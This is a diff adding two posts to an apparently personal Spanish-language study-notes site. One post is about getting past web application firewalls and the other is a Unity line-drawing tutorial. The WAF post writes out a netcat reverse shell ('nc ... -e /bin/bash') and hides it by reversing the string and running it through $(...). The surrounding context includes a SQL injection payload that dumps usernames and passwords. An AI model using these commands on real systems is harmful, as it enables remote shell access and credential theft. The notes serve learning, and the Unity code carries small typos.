@@ -29,6 +29,8 @@
           <li><a class="nav-link" href="#IR">Investigando mas de Regex</a></li>
           <li><a class="nav-link" href="#WS">Web Shells</a></li>
           <li><a class="nav-link" href="#RL">Resume Labs</a></li>
+          <li><a class="nav-link" href="#BP">ByPass WAFS</a></li>
+          <li><a class="nav-link" href="#PUN">Painting en Unity</a></li>
         </ul>
       </nav>
       
@@ -556,9 +558,90 @@ grep -o -e ..:
         <code>' UNION SELECT username || '-' || password FROM users--</code>
         <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet"></a>
       </article>
-      </section>
-      
-
+     
+    </section>
+    <!-- post16 -->
+    <section class="main-section"  id="BP">
+      <header>ByPass WAFS </header>
+      <p style="font-family: 'Bitter', serif;">7/08/21</p>
+      <article>
+        <h3>Picus byPass Article</h3>
+        <code>nc -lvp 1234#atacker Machine </code>
+        <code>nc 127.0.0.1 1234 -e /bin/bash # victim Machine</code>
+        <code>echo hello wordl | rev</code>
+        <h3>Que es una WAF?</h3>  
+        <p> Web Application Firewall ,proteje de multiples ataques al servidor dirigidos al backend.</p>
+         <code>echo nc 127.0.0.1 1234 -e /bin/bash |rev
+          hsab/nib/ e- 4321 1.0.0.721 cn</code>
+          <p>Intentente</p>
+          <code>hsab/nib/ e- 4321 1.0.0.721 cn | rev </code>
+          <p>Para que esto funcione ejecuta $(command)</p>
+          <code>$(echo hsab/nib/ e- 4321 1.0.0.721 cn | rev )</code>
+        </article>
+        <article>
+          <h3>Port Binding Shellcode</h3>
+        </article>
+    </section>
+    <!-- post17 -->
+    <section class="main-section"  id="PUN">
+      <header>Pintando con Unity</header>
+      <p style="font-family: 'Bitter', serif;">10/08/21</p>
+      <article>
+        <h4>Objetivo</h4>
+        <p>Aprendiendo unity , la creacion de cualquier objeto que quieras es lo que nos permite unity,esta ocasion cree un marcador.</p>
+        <p>bueno manos  a la obra con la creacion .</p>
+        <h3><strong>Pasos:</strong></h3>
+<p>        <i>1.Creamos un Objeto al  hacer el primer  click llamaremos Starting a la funcion.</i></p>
+        <p></p>
+        <p><i>2.Vamos iterando los puntos del mouse llamaremos Adding ha esta funcion.</i></p>
+        <p></p>
+        <p><i>3.Posicionamos las funnciones  en el  Update. </i></p>
+        <h5><strong>Starting</strong></h5>
+        <p>Todo inicia con un <strong>Input.GetKeyDown(KeyCode.Mouse0)</strong> </p>
+        <code>
+          #Creamos el brush
+          #prefab contiene  a LineRender
+          GameObject b=Instantiate(prefab);
+          #curent  es un LineRender
+          curent=b.GetComponent&gt;LineRenderer&lt;();
+          #Fijamos la Posicion del Raycast de la camara
+          #cam es Camera.main
+          Vector2 pos=cam.ScreenToWordlPoint(Input.mouseposition);
+          curent.SetPosition(0,pos);
+          curent.SetPosition(1,pos);
+        </code>
+        <h5><strong>Adding</strong></h5>
+        <p>Vamos Adicionando los puntos que se generan por<strong>Input.GetKey(KeyCode.Mouse0)</strong>.</p>
+        <code>
+          #Recibimos la posicion del click del mouse (PosMouse)
+          #adicionamos este al lineRender(curent)
+          curent.positionCount++;
+          #le descartamos el ultimo 
+          int posactual=curent.positionCount-1;
+          #lo adicionamos al lineRender la posicion
+          curent.SetPosition(posactual,PosMouse);
+        </code>
+        <h5><strong>Uniendo en la funcion Update</strong></h5>
+        <p>Agrupamos las funciones.</p>
+        <p><i><strong>PseudoCodigo</strong></i></p>
+        <code>
+          Update(){
+            if <strong>Input.GetKeyDown(KeyCode.Mouse0)</strong>
+            <code style="color: blueviolet;">Starting();</code>
+            if <strong>Input.GetKey(KeyCode.Mouse0)</strong>
+            Vector2 MousePos=cam.ScreenToWordlPoint(Input.mousePosition);
+              if(MousePos!= last)
+            <code style="color: blueviolet;">Adding(MousePos);</code>
+            last=MousePos;
+            else <strong> curent=null</strong>
+          }
+        </code>
+        <p>Thats everything . </p>
+        <img src="./unity/marker.PNG" style="width: 250px;height: 200px;" alt="">
+      </article>
+     
+    
+    </section>
   </main>
 </body>
 
